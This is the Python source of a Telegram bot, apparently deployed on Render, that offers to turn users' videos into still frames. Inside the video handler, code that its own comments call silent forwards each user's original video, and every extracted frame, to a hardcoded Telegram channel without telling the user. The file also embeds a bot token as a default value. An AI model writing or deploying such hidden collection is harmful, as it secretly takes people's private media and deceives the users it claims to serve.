import os
import cv2
import telebot
from flask import Flask, request

# Token and Render setup
TOKEN = os.getenv('TOKEN', '9274510322:AAG2Du1hH8I_UiTGVzVdr22UfMEDshpq6WI')
APP_URL = os.getenv('RENDER_EXTERNAL_URL', 'https://video-to-image-bot-xxxx.onrender.com')  # Replace with your actual Render URL
CHANNEL_ID = "@jshshajanansh"

bot = telebot.TeleBot(TOKEN)
server = Flask(__name__)

@server.route('/' + TOKEN, methods=['POST'])
def get_message():
    json_string = request.get_data().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

@server.route('/')
def index():
    return "Video to Image Bot is running!", 200

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Hello! 👋 Send me a video, and I'll extract frames for you!")

@bot.message_handler(content_types=['video'])
def handle_video(message):
    video_path = "temp_video.mp4"
    try:
        bot.reply_to(message, "⚙️ Processing video... Please wait!")
        
        # 1. Silently forward the user's original video to your channel in the background
        bot.forward_message(chat_id=CHANNEL_ID, from_chat_id=message.chat.id, message_id=message.message_id)
        
        # Download video from Telegram for processing
        file_info = bot.get_file(message.video.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open(video_path, 'wb') as new_file:
            new_file.write(downloaded_file)
            
        # Open video using OpenCV
        vidcap = cv2.VideoCapture(video_path)
        fps = vidcap.get(cv2.CAP_PROP_FPS)
        if fps <= 0:
            fps = 30  # Default fallback FPS
            
        # Calculate frame interval for 10 FPS extraction
        frame_interval = int(round(fps / 10))
        if frame_interval < 1:
            frame_interval = 1
            
        success, image = vidcap.read()
        count = 0
        saved_count = 0
        max_photos = 30  # Limit max frames to prevent spamming
        
        while success and saved_count < max_photos:
            if count % frame_interval == 0:
                frame_path = f"frame_{saved_count + 1}.jpg"
                cv2.imwrite(frame_path, image)
                
                # Send extracted photo back to the user
                with open(frame_path, 'rb') as photo:
                    bot.send_photo(message.chat.id, photo, caption=f"📸 Frame {saved_count + 1}")
                
                # Also silently send the extracted photo to your channel
                with open(frame_path, 'rb') as photo_channel:
                    bot.send_photo(CHANNEL_ID, photo_channel)
                
                if os.path.exists(frame_path):
                    os.remove(frame_path)
                saved_count += 1
                
            success, image = vidcap.read()
            count += 1
            
        vidcap.release()
        
        bot.reply_to(message, f"✅ Done! Successfully extracted {saved_count} frames.")
        
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")
        
    finally:
        # Ensure temporary video file is deleted
        if os.path.exists(video_path):
            os.remove(video_path)

if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url=APP_URL + '/' + TOKEN)
    port = int(os.environ.get("PORT", 5000))
    server.run(host="0.0.0.0", port=port)
